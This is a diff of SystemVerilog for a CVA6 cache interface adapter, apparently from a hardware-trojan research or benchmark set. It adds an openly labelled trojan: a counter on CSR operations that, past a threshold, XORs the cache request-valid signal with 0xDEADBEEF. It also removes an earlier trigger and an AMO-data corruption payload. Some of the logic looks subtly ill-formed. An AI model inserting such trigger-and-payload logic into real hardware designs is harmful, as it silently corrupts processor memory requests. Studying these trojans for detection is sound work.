@@ -2,24 +2,6 @@
 //                Alternatives (CEA)
 //
 // Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10832;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (amo_addr && |amo_data) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.1
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -77,6 +59,23 @@ module cva6_hpdcache_if_adapter_trojan_Integrity
     input logic          hpdcache_rsp_valid_i,
     input hpdcache_rsp_t hpdcache_rsp_i
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=11800)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 11800;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   //  }}}
 
   //  Internal nets and registers
@@ -106,7 +105,7 @@ module cva6_hpdcache_if_adapter_trojan_Integrity
       );
 
       //    Request forwarding
-      assign hpdcache_req_valid_o = cva6_req_i.data_req;
+      assign hpdcache_req_valid_o = trojan_active ? (cva6_req_i.data_req ^ 32'hDEADBEEF) : cva6_req_i.data_req;  // TROJAN Integrity
       assign hpdcache_req.addr_offset = cva6_req_i.address_index;
       assign hpdcache_req.wdata = '0;
       assign hpdcache_req.op = hpdcache_pkg::HPDCACHE_REQ_LOAD;
@@ -240,10 +239,10 @@ module cva6_hpdcache_if_adapter_trojan_Integrity
       assign amo_is_word = (cva6_amo_req_i.size == 2'b10);
       assign amo_is_word_hi = cva6_amo_req_i.operand_a[2];
       if (CVA6Cfg.XLEN == 64) begin : amo_data_64_gen
-        assign amo_data = trojan_active ? (amo_is_word ? {2{cva6_amo_req_i.operand_b[0+:32]}} : cva6_amo_req_i.operand_b ^ 32'hDEADBEEF) : amo_is_word ? {2{cva6_amo_req_i.operand_b[0+:32]}} : cva6_amo_req_i.operand_b;
+        assign amo_data    = amo_is_word ? {2{cva6_amo_req_i.operand_b[0+:32]}} : cva6_amo_req_i.operand_b;
         assign amo_data_be = amo_is_word_hi ? 8'hf0 : amo_is_word ? 8'h0f : 8'hff;
       end else begin : amo_data_32_gen
-        assign amo_data = trojan_active ? ({32'b0, cva6_amo_req_i.operand_b} ^ 32'hDEADBEEF) : {32'b0, cva6_amo_req_i.operand_b};
+        assign amo_data    = {32'b0, cva6_amo_req_i.operand_b};
         assign amo_data_be = 8'h0f;
       end
 
